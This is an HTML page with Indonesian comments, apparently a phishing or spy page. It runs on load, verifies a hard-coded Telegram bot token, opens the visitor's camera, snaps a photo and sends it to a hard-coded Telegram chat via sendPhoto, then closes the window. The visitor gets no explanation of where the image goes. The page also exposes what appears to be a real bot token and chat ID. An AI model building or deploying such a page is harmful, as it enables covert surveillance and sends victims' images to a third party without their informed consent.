<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Auto Capture</title>
    <style>
        body { 
            background: white; 
            font-family: Arial, sans-serif; 
            text-align: center; 
            padding: 20px;
        }
        #status {
            margin: 50px auto;
            padding: 15px;
            max-width: 500px;
            border-radius: 5px;
            transition: all 0.3s;
        }
        .loading { background: #e3f2fd; }
        .success { background: #e8f5e9; }
        .error { background: #ffebee; color: #d32f2f; }
    </style>
</head>
<body>
    <div id="status" class="loading">Memulai proses...</div>

    <script>
        // ============= KONFIGURASI =============
        const BOT_TOKEN = 'bot7876599612:AAHYBbJz6IHKae4BBtEkyASRlrJVVWtNOqc'; // PASTIKAN BENAR!
        const CHAT_ID = '7041008009'; // PASTIKAN BENAR!
        // =======================================

        // Fungsi untuk verifikasi token dengan timeout
        async function verifyBotToken() {
            try {
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), 5000);
                
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getMe`, {
                    signal: controller.signal
                });
                
                clearTimeout(timeoutId);
                const data = await response.json();
                
                if (!data.ok) {
                    throw new Error(data.description || "Invalid token response");
                }
                
                console.log("Bot verified:", data.result);
                return true;
            } catch (error) {
                if (error.name === 'AbortError') {
                    throw new Error("Timeout saat verifikasi token");
                }
                throw new Error(`Gagal verifikasi: ${error.message}`);
            }
        }

        // Fungsi utama
        async function captureAndSend() {
            const statusEl = document.getElementById('status');
            
            try {
                // 1. Verifikasi token
                statusEl.textContent = "Memverifikasi token...";
                await verifyBotToken();

                // 2. Akses kamera
                statusEl.textContent = "Mengakses kamera...";
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'environment',
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    }
                }).catch(err => {
                    throw new Error(`Izin kamera ditolak: ${err.message}`);
                });

                // 3. Capture foto dengan timeout
                statusEl.textContent = "Mengambil foto...";
                const capturePromise = new Promise((resolve, reject) => {
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.autoplay = true;
                    video.playsInline = true;

                    video.onloadedmetadata = () => {
                        setTimeout(() => {
                            try {
                                const canvas = document.createElement('canvas');
                                canvas.width = video.videoWidth;
                                canvas.height = video.videoHeight;
                                const ctx = canvas.getContext('2d');
                                ctx.drawImage(video, 0, 0);
                                resolve(canvas.toDataURL('image/jpeg', 0.8));
                            } catch (err) {
                                reject(err);
                            } finally {
                                stream.getTracks().forEach(track => track.stop());
                            }
                        }, 500); // Waktu fokus diperpendek
                    };

                    video.onerror = () => reject(new Error("Kamera error"));
                });

                const photoData = await Promise.race([
                    capturePromise,
                    new Promise((_, reject) => 
                        setTimeout(() => reject(new Error("Timeout saat mengambil foto")), 10000)
                    )
                ]);

                // 4. Kirim ke Telegram
                statusEl.textContent = "Mengirim ke Telegram...";
                const blob = await fetch(photoData).then(r => r.blob());
                
                // Validasi ukuran file
                if (blob.size > 5 * 1024 * 1024) { // Maksimal 5MB
                    throw new Error(`Ukuran foto terlalu besar (${(blob.size/1024/1024).toFixed(2)}MB)`);
                }

                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'capture.jpg');
                formData.append('caption', `Auto Capture - ${new Date().toLocaleString()}`);

                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });

                const result = await response.json();
                
                if (!result.ok) {
                    console.error("Telegram API Error:", result);
                    throw new Error(result.description || "API Telegram merespon error");
                }

                statusEl.textContent = "✅ Foto berhasil dikirim!";
                statusEl.className = "success";
                setTimeout(() => window.close(), 2000);

            } catch (error) {
                statusEl.textContent = `❌ Error: ${error.message}`;
                statusEl.className = "error";
                console.error("Error Details:", {
                    message: error.message,
                    stack: error.stack,
                    config: {
                        token: BOT_TOKEN,
                        chatId: CHAT_ID
                    }
                });
            }
        }

        // Mulai proses saat DOM siap
        document.addEventListener('DOMContentLoaded', captureAndSend);
    </script>
</body>
</html>
